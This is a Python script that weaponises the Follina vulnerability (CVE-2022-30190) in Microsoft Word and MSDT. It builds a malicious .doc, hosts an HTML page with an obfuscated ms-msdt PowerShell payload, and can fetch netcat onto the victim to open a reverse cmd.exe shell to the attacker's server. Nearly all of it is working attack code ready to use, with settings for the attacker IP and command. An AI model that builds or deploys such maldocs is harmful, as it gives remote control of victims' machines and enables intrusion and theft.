"""
Exploitation of MSDT (Microsoft Support Diagnostic Tool) for Backdoor Access through Microsoft Word Documents
 - using CVE-2022-30190 aka FOLLINA

This script takes advantage of the .doc/docx vulnerability. It will be updates soon
 - to add support for the .rtf 0click exploit
"""

"""
External Credits:
  Crazyman & Shadow Chaser Group (finding CVE-2022-30190)
  John Hammond (base&networking)
"""

import tempfile
import shutil
import os
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
from threading import Thread

class Data:
    """ Arguments used for the maldoc build """
    host_ip = "YOUR-IP" # IP to host the webserver on (your local ip/your vps)
    port = 8000 # port to host the webserver on
    command = "calc" # command to run on maldoc execution
    output  = "./mal.doc" # where to build the document
    reverse = None # port to host shell (optional)
    suffix  = "doc"

class c:
    """ Program Coloring """
    r = u"\u001b[31m"
    g = u"\u001b[32m"
    w = u"\u001b[0m"

class Tools:
    """ Simple tools to make the setup easier """
    @staticmethod
    def Log(syn, message, value) -> None:
        print(
            f"{c.w}[{c.g}{syn}{c.w}] "
            f"{message} -> {c.g}{value}{c.w}"
        )

    @staticmethod
    def StartThreads(func, _threads) -> None:
        for i in range(_threads):
            thread = Thread(target=func)
            thread.start()

class Setup:

    def __init__(maldoc):
        maldoc.http_host = ipaddress.IPv4Address(Data.host_ip)
        maldoc.command = f"""Invoke-WebRequest https://github.com/codeuk/MSDT-Exploit/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {maldoc.http_host} {Data.reverse}""" if Data.reverse != None else Data.command
        maldoc.base64_payload = base64.b64encode(maldoc.command.encode("utf-8")).decode("utf-8")
        maldoc.payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{maldoc.base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
        maldoc.payload += (
            "".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) # buffer overflow for msdt
            + "\n</script>"
        )

    class Dirs:
        """ Commonly used Directories """
        staging = os.path.join(tempfile._get_default_tempdir(),next(tempfile._get_candidate_names()))   
        doc_path = os.path.join(staging, Data.suffix) 
        http_path = os.path.join(staging, "www")
        rels_path = os.path.join(staging, Data.suffix, "word", "_rels", "document.xml.rels")

    def Main(maldoc):
        """ Generate Document and Payloads """
        maldoc.Dirs.doc_path = os.path.join(maldoc.Dirs.staging, Data.suffix)
        shutil.copytree(Data.suffix, os.path.join(maldoc.Dirs.staging, maldoc.Dirs.doc_path))
        Tools.Log("+", "COPIED STAGING DOC", f"{maldoc.Dirs.staging}")

        os.makedirs(maldoc.Dirs.http_path)

        with open(maldoc.Dirs.rels_path) as _file:
            html_referral = _file.read().replace(
                "{staged_html}", f"http://{maldoc.http_host}:{Data.port}/index.html"
            )

        with open(maldoc.Dirs.rels_path, "w") as _file:
            _file.write(html_referral)

        zip_name = f"{Data.output.split('./')[1]}.zip"
        doc_name = Data.output.split('./')[1]
        
        for filep in zip_name, doc_name:
            if os.path.exists(filep):
                os.remove(filep)
                Tools.Log("!", "REMOVED", filep)

        shutil.make_archive(Data.output, "zip", maldoc.Dirs.doc_path)
        os.rename(zip_name, Data.output)
        Tools.Log("+", "CREATED", Data.output)

        with open(os.path.join(maldoc.Dirs.http_path, "index.html"), "w") as _file:
            _file.write(maldoc.payload)

        class ReuseTCPServer(socketserver.TCPServer):
            """ TCP Server Binding """
            def server_bind(_tcp):
                _tcp.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                _tcp.socket.bind(_tcp.server_address)

        class Handler(http.server.SimpleHTTPRequestHandler):
            """ HTTP Request Logging Handler """
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=maldoc.Dirs.http_path, **kwargs)

            def log_message(self, format, *func_args):
                if Data.reverse: return
                else: super().log_message(format, *func_args)

            def log_request(self, format, *func_args):
                if Data.reverse: return
                else: super().log_request(format, *func_args)

        def HTTP():
            """ Threaded HTTP Server """
            with ReuseTCPServer(("", Data.port), Handler) as malhttp:
                malhttp.serve_forever()

        Tools.Log("+", "SERVING", f"HTTP @ {maldoc.http_host}:{Data.port}")
        if Data.reverse:
            Tools.StartThreads(HTTP, 1)
            Tools.Log("+", "STARTING", f"'nc64 -lvnp {Data.reverse}'")
            os.system(f"nc64 -lnvp {Data.reverse}")
        else:
            Tools.Log("+", "LISTENING", f"PORT {Data.port}")
            HTTP()


if __name__ == "__main__":
    Follina = Setup()
    Follina.Main()
